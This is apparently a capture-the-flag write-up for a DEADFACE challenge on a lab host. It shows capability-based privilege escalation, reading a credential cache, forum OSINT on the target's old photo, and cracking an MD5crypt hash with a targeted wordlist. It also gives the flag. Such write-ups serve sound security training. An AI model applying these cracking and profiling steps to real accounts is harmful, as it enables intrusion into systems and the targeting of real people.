# Old Habits

> **Category:** OSINT / Password Cracking / Privilege Escalation · **Points:** 350 · **Track:** [OSINT](README.md)

## Objective

Track down DEADFACE's second-in-command, `mort1cia`, on the remote host `charon`. The target is known to reuse a personal password across services, including an old account on the in-universe social platform GhostTown. The challenge requires chaining a prior foothold, a privilege-escalation bug, OSINT, and offline password cracking to finally read `mort1cia`'s flag.

## Step 1: Establishing a foothold and escalating privileges

A separate foothold challenge ("Foothold on Charon") provides an initial low-privilege shell as `svc-deploy` on the host `charon`. From there, standard Linux privilege-escalation enumeration was run:

```bash
$ id
uid=1001(svc-deploy) gid=1001(svc-deploy) groups=1001(svc-deploy)

$ cat /home/svc-deploy/.bash_history   # password-rotation hints
$ cat /opt/deploy/README.txt           # ops notes
$ getcap -r / 2>/dev/null
/opt/crypto/cryptctl cap_setuid=ep
```

The `cryptctl` binary carries the Linux capability `cap_setuid=ep`, meaning it is permitted to change its effective UID even though it is not a traditional setuid-root binary (see [Dangerous Capability](../privilege-escalation/dangerous-capability.md) for the full exploitation of this bug). Simply executing it elevates the shell's effective UID to 1006 (`spookyboi`):

```bash
$ /opt/crypto/cryptctl
[cryptctl] assuming the crypto service identity.
$ id
uid=1006(spookyboi) gid=1001(svc-deploy) groups=1001(svc-deploy)
```

## Step 2: Finding mort1cia's password hash

As `spookyboi`, a backup credential cache was found and readable:

```bash
$ cat /home/spookyboi/.backup/creds.bak
# Kingmaker cred cache. mort1cia STILL has not changed her password since the
# op kicked off -- and she reuses the same personal one everywhere, even on
# her old GhostTown account. If you need into her box, read her posting history.
# format: user:hash
mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20
```

The hash is in the classic MD5crypt format (`$1$salt$hash`). The comment explicitly points to OSINT on GhostTown as the way to recover the plaintext.

## Step 3: OSINT on GhostTown

Searching GhostTown's forum history for `mort1cia` turned up a thread titled *"yo mort1cia... we need to talk about ur past"*, in which another member (`gh0st404`) resurfaces an old Halloween photo of her in a pink princess dress, tiara and magic wand, and admits to having picked "something easy for her to remember" as her password when setting up her account on `charon`.

![Halloween photo recovered from mort1cia's GhostTown posting history](../../assets/old-habits-halloween-photo.png)

*Halloween photo recovered from mort1cia's GhostTown posting history, dated 2015-10-31. The costume theme (princess / tiara) and the photo's own date stamp supplied the two ingredients needed for a targeted wordlist.*

Other posts in the same thread reinforced the theme (teammates jokingly calling her "princess", referencing "my prince will come"), while a separate thread showed the team's established password convention: combining a themed word with a year, e.g. `Sk4t3rB0y_S1nce_2011` for another member.

## Step 4: Building a targeted wordlist and cracking the hash

Combining the costume theme with the photo's date (2015) into a small, targeted wordlist and running it through John the Ripper (rather than a generic list such as `rockyou.txt`, which the hash did not match) cracked the hash almost instantly:

```bash
$ cat mort1cia.hash
mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20

$ john --wordlist=mort1cia_wordlist.txt --rules=Jumbo mort1cia.hash
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants))
princess2015     (mort1cia)
1g 0:00:00:00 DONE
Session completed.

$ john --show mort1cia.hash
mort1cia:princess2015
```

The cracked password, **princess2015**, combines the costume theme from the photo with the year it was taken, exactly the pattern suggested by the team's own password conventions observed elsewhere.

## Step 5: Reading the flag

```bash
$ su mort1cia
Password: princess2015

$ id
uid=1007(mort1cia) gid=1007(mort1cia) groups=1007(mort1cia)

$ cat ~/flag.txt
deadface{0s1nt_n3v3r_f0rg3ts}
```

From `mort1cia`, the chain continues in [Heavy is the Crown](../privilege-escalation/heavy-is-the-crown.md).

## Flag

```
deadface{0s1nt_n3v3r_f0rg3ts}
```

---
[← Back to index](../../README.md)
